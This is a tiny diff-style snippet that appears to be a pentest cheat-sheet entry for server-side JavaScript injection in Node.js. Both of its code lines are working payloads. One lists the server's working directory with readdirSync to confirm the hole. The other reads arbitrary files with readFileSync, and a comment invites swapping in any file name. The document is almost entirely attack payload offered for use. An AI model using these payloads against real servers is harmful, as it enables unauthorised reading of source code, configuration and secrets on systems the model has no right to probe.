@@ -1,0 +1,5 @@
+#To check and identify the vulnerability
+res.end(require('fs').readdirSync('.').toString()) 
+
+#To read files, replace the app.js with your required file name
+res.end(require('fs').readFileSync("app.js")) 
